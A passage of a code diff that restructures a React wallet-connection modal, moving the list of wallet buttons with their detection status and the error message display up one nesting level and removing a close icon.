+                    className="w-full flex items-center gap-3 py-3 px-4 rounded-xl font-bold text-lg transition-all bg-slate-800 hover:bg-slate-700 text-white border border-indigo-500/30"
                   >
-                    <X size={18} />
+                    <span className="text-2xl">{wallet.icon}</span>
+                    <span className="flex-1 text-left">{wallet.name}</span>
+                    <span className={`text-xs ${isDetected ? 'text-green-400' : 'text-slate-400'}`}>
+                      {isDetected ? 'Detected' : /iPhone|iPad|iPod|Android/i.test(typeof navigator !== 'undefined' ? navigator.userAgent : '') ? 'Open app' : 'Not detected'}
+                    </span>
                   </button>
+                );
+              })}
+              {walletError && (
+                <div className="mt-3 p-3 bg-red-500/10 border border-red-500/20 text-red-400 text-sm rounded-lg flex items-center gap-2">
+                  <AlertCircle size={16} />
+                  {walletError}
                 </div>
-                <div className="p-4 space-y-2">
-                  {WALLETS.map(wallet => {
-                    const detected = wallet.getProvider();
-                    const solanaDetected = wallet.getSolanaProvider?.();
-                    const isDetected = detected || solanaDetected;
-                    return (
-                      <button
-                        key={wallet.id}
-                        type="button"
-                        onClick={() => connectWallet(wallet)}
-                        className="w-full flex items-center gap-3 py-3 px-4 rounded-xl font-bold text-lg transition-all bg-slate-800 hover:bg-slate-700 text-white border border-indigo-500/30"
-                      >
-                        <span className="text-2xl">{wallet.icon}</span>
-                        <span className="flex-1 text-left">{wallet.name}</span>
-                        <span className={`text-xs ${isDetected ? 'text-green-400' : 'text-slate-400'}`}>
-                          {isDetected ? 'Detected' : /iPhone|iPad|iPod|Android/i.test(typeof navigator !== 'undefined' ? navigator.userAgent : '') ? 'Open app' : 'Not detected'}
-                        </span>
-                      </button>
-                    );
-                  })}
-                  {walletError && (
-                    <div className="mt-3 p-3 bg-red-500/10 border border-red-500/20 text-red-400 text-sm rounded-lg flex items-center gap-2">
-                      <AlertCircle size={16} />
-                      {walletError}
-                    </div>
-                  )}
-                </div>
-              </div>
+              )}
             </div>
-          )}
+          </div>
         </div>,
         document.body
       )}
     </>
   );
 }
+
